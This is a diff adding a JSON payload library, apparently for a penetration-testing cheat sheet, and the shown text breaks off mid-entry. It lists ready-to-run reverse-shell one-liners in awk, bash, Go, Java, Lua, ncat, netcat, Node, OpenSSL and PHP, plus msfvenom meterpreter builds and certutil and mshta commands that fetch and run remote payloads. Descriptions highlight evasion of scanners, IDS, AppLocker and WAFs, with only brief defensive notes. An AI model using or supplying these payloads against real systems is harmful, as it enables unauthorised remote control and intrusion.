@@ -1,0 +1,602 @@
+[
+  {
+    "id": "cca9f096-9cd7-5de4-95f4-26643645785a",
+    "label": "Awk Reverse Shell",
+    "command": "awk 'BEGIN {s = \"/inet/tcp/0/<IP>/<PORT>\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
+    "description": "<p>An obscure payload utilizing `gawk`/`awk` pattern-matching pipelines. Highly likely to bypass static scanning as it manipulates network streams natively via `/inet/tcp/`.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Awk</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:awk",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "3a2ff654-b80b-5393-afa0-9b30e4d7b275",
+    "label": "Bash TCP Interactive Shell",
+    "command": "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1",
+    "description": "<p>The most common, dependency-free reverse shell for Linux targets. Relies on bash's built-in networking capability via `/dev/tcp`.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Bash</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:bash",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "8513ad6b-df69-5817-933b-9cd692415835",
+    "label": "Bash UDP Shell",
+    "command": "sh -i >& /dev/udp/<IP>/<PORT> 0>&1",
+    "description": "<p>Alternative to TCP. Extremely useful when egress firewalls strictly block outgoing TCP connections but permit DNS (port 53 UDP) or NTP (port 123 UDP).</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Bash</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:bash",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "9e9882aa-1bca-54cc-814c-b650a50e8280",
+    "label": "C Compiled Reverse Shell",
+    "command": "# Requires local compilation via gcc /tmp/shell.c -o /tmp/shell",
+    "description": "<p>The lowest-level approach. Directly manipulates UNIX socket APIs and uses `dup2` to bind them to the PID's execution thread.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#C</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:c",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "933e31a7-e1b0-580b-b80a-fa4abcda9ec3",
+    "label": "Certutil.exe Download Cradle",
+    "command": "certutil -urlcache -split -f http://<IP>/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe",
+    "description": "<p>Leverages the Windows Certificate Utility (`certutil.exe`) to fetch a malicious Base64 document, decode it locally to a `.exe`, and execute it.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Certutil.exe</span> (Typically a standard utility on windows targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:windows",
+      "tool:certutil.exe",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "6e6505dd-f837-5bbd-995e-fdca61419bb2",
+    "label": "Golang Compiled Shell",
+    "command": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"<IP>:<PORT>\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
+    "description": "<p>Drops a `.go` file, builds it natively using the Go compiler to pipe standard I/O to a TCP dialer, and executes it.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Golang</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:golang",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "089ce189-caa2-585f-a548-710e8628ac46",
+    "label": "Java Runtime/ProcessBuilder Shell",
+    "command": "r = Runtime.getRuntime() p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \\\\$line 2>&5 >&5; done\"] as String[]) p.waitFor()",
+    "description": "<p>A Java interpretation of the Bash routing shell. Extremely useful when encountering Remote Code Execution (RCE) via insecure deserialization or Tomcat abuse.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Java</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:java",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "924c6607-f22b-5c2b-934a-6acba44dea36",
+    "label": "Java Threaded Revere Shell",
+    "command": "Thread thread = new Thread(){ public void run(){ /* Reverse shell socket code executing inside parallel thread */ } }; thread.start();",
+    "description": "<p>Masks the shell execution by spinning it out as a detached Thread, preventing the target application from hanging and improving stealth.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Java</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:java",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "fb723e2e-f9d1-561e-bbdd-741ca70dbb2f",
+    "label": "Lua Reverse Shell",
+    "command": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('<IP>','<PORT>');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
+    "description": "<p>Lua executes arbitrary shell commands through its `socket` library. Useful in constrained environments like Nginx configurations, HAProxy, or embedded IoT systems.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Lua</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:lua",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "5d347d2a-929f-542c-92d1-1867b916e1b2",
+    "label": "MSFVenom ASPX IIS Payload",
+    "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx",
+    "description": "<p>A web-malware payload designed to be dropped onto compromised Microsoft IIS servers, executing C# inline.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#MSFVenom</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:msfvenom",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "83651545-96af-5ed1-8dc0-99bcaf631c99",
+    "label": "MSFVenom Linux ELF Shell",
+    "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf",
+    "description": "<p>Generates an executing Linux `.elf` binary payload. Ideal for situations where scripting languages (Python/Perl/PHP) are entirely stripped from the target.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#MSFVenom</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:msfvenom",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "dc46d03e-1326-575b-bf25-10b1d2fc0235",
+    "label": "MSFVenom Tomcat WAR Payload",
+    "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > reverse.war",
+    "description": "<p>Wraps a JSP java payload inside an archive (.war) compatible with Enterprise Web Application servers like Apache Tomcat, JBoss, or WebLogic.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#MSFVenom</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:msfvenom",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "0676d60d-96ff-5a2b-92df-61c4b88a9bbd",
+    "label": "MSFVenom Win64 Meterpreter TCP",
+    "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe",
+    "description": "<p>Drops a small \"stager\" that reaches back to Metasploit, allocating memory to seamlessly download the expansive Meterpreter framework.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#MSFVenom</span> (Typically a standard utility on windows targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:windows",
+      "tool:msfvenom",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "cca05d60-e640-5492-9405-abdb77dfe755",
+    "label": "MSFVenom Win64 Reverse TCP (Stageless)",
+    "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe",
+    "description": "<p>Generates a compiled Windows PE executable containing a stageless shell. Hardcodes the complete payload instead of stager loading.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#MSFVenom</span> (Typically a standard utility on windows targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:windows",
+      "tool:msfvenom",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "a848c365-8664-5d71-b79d-ec2f8134e2e2",
+    "label": "MSFVenom macOS Shell",
+    "command": "msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > shell.macho",
+    "description": "<p>Generates a compiled native Mach-O executable for attacking macOS infrastructure.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#MSFVenom</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:msfvenom",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "570cf62a-fc01-58d8-ad98-0887092342f2",
+    "label": "Mshta.exe Remote Execution",
+    "command": "mshta vbscript:Close(Execute(\"GetObject(\"\"script:http://<IP>/payload.sct\"\")\"))",
+    "description": "<p>Executes an arbitrary HTML Application (`.hta`) or remotely hosted Scriptlet (`.sct`) using `mshta.exe`, bypassing application whitelisting (AppLocker) policies.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Mshta.exe</span> (Typically a standard utility on windows targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:windows",
+      "tool:mshta.exe",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "38a15c45-7e43-56f9-abdc-756ae2ad4760",
+    "label": "NCat (Nmap) Encrypted Shell",
+    "command": "ncat <IP> <PORT> --ssl -e \"/bin/bash\"",
+    "description": "<p>Uses Nmap's upgraded `ncat` binary to wrap the reverse shell in an SSL/TLS tunnel, heavily encrypting the traffic and evading plaintext Intrusion Detection Systems (IDS).</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#NCat</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:ncat",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "134f6dad-0baa-5916-9a8b-7a0cf20d223c",
+    "label": "Netcat Mkfifo Pipe Shell",
+    "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f",
+    "description": "<p>Required when the target's Netcat lacks the `-e` flag (e.g., Ubuntu default OpenBSD nc). Uses named pipes (`mkfifo`) to route standard I/O over the socket.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Netcat</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:netcat",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "b986de9a-f575-5105-8787-94433632cd1b",
+    "label": "Netcat (nc -e) Shell",
+    "command": "nc -e /bin/sh <IP> <PORT>",
+    "description": "<p>The classic Netcat reverse shell using the `-e` (execute) flag. Fast and minimal.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Netcat</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:netcat",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "75b170f0-827a-5362-96b5-5bf0ff4be0d5",
+    "label": "NodeJS Socket Pipe Shell",
+    "command": "node -e 'require(\"child_process\").exec(\"bash -c \\\"bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\\\"\")'",
+    "description": "<p>A rapid Node.js wrapper leveraging `child_process.exec()` to pivot into a Bash networking shell on modern JavaScript backends.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#NodeJS</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:nodejs",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "59542c09-9c52-529d-8dc5-a3b1582f1b12",
+    "label": "OpenSSL Encrypted Shell",
+    "command": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <IP>:<PORT> > /tmp/s; rm /tmp/s",
+    "description": "<p>A \"living off the land\" encrypted shell. It uses standard OpenSSL binaries on Linux to wrap `mkfifo` piping in TLS without needing `ncat` or `socat`.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#OpenSSL</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:openssl",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "21446e10-0e47-5901-830d-80f85a6c6eea",
+    "label": "PHP Socket Shell",
+    "command": "php -r '$sock=fsockopen(\"<IP>\",<PORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+    "description": "<p>A one-liner PHP process injection often used on compromised LAMP-stack web servers without writing a shell file to disk.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#PHP</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:php",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "ad9de0c8-5f22-5361-a9ea-bff04866a191",
+    "label": "PHP proc_open Shell",
+    "command": "php -r '$sock=fsockopen(\"<IP>\",<PORT>);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
+    "description": "<p>Bypasses basic WAF/disable_functions by utilizing `proc_open()` instead of the highly-monitored `exec()` or `system()` calls.</p>\n<p>This reverse shell technique is categorized as a high-velocity payload commonly used during post-exploitation.</p>\n<ol>\n  <li><strong>What attacker gains:</strong> Remote interactive command execution on the target system, granting initial access or enabling lateral movement.</li>\n  <li><strong>Attack pre-requisite:</strong> The ability to execute arbitrary commands (RCE) on the target host and unrestricted egress network filtering to the attacker's listening IP/Port.</li>\n</ol>\n<ul>\n  <li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#PHP</span> (Typically a standard utility on linux targets, or dropped as a compiled payload).</li>\n  <li><strong>Detection/Defense opsec:</strong> Monitor process execution behavior for LOLBins spawning anomalous network connections. Enforce strict Egress filtering holding a default-deny policy for outbound traffic.</li>\n</ul>",
+    "tags": [
+      "shell:reverse",
+      "network:tcp",
+      "platform:linux",
+      "tool:php",
+      "post-exploitation"
+    ],
+    "color": "#10b981",
+    "hasGraph": false
+  },
+  {
+    "id": "27555bf9-612c-5d86-b60c-e3b9258f2166",
+    "label": "Perl Socket Fork Shell",
